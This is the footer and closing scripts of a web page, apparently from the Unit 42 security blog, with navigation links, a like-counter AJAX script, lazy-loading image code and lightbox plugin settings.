<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
